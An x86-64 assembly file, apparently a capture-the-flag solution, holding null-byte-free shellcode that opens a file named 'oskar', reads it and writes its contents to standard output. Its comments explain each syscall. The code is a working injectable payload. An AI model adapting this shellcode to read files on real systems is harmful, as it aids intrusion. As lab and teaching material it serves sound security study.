Section .text:
        global _start


; https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
; most if not all these instructions are somewhat specific to the bytes
; it reads/writes to because it ensures that our resulting shellcode contains no null terminators
; you don't have to write it like this.. this challenge doesn't mind null terminators :)

_start:
        lea rcx, [rel flagname] ; loads the ADDRESS of where the string is
        xor rdi, rdi    ; clearing out registers, better be safe than sorry
        xor rdx, rdx    ; /\ 
        xor rsi,rsi     ; actually, these are the flags used by open to determine if we are reading, writing, or doing both, 0 indicates read only
        mov rdi, rcx    ; loading string into rdi, commonly used as the first argument in any subrouting
        xor rax, rax    ; clear rax because we'll address which syscall we want with it
        mov byte al, 0x2 ; mov instruction of 1 byte to register rax --> eax --> ah --> al
        syscall ;--open system call

        ;the rax register now has a number that represents the file that we want to read from
        xor rdi, rdi    ; clear register from last call
        xor rdx, rdx    ; probably don't need this either
        mov rdi, rax    ; takes the file descriptor from rax 
        mov byte dl, 0x29       ; length of the buffer, how much we want to read from the file rdx register
        xor rax, rax            ; system call number is 0..
        lea rsi, [rel flagname+0x5] ;eeds to be an address to store the goods, used the address after the end of our long string
        syscall ;read syscall
          
        ; rsi is already set to have the buffer we want to read, so don't clear it and 
        ; hold it as it is
        xor rdx, rdx ; the usual register clear
        xor rdi, rdi ; the usual register clear
        mov byte dl, 0x29 ; length of buffer rdx
        mov word di, 0x1 ; file descriptor rdi
        mov byte al, 0x1 ; eax syscall number
        syscall ; write

        xor rbx, rbx
        xor rax, rax
        xor rdi, rdi
        mov al, 0x3c
        syscall ; exit system call!

flagname:
        db "oskar"
        db 0x00, 0x00 ; places null characters to avoid continueing string

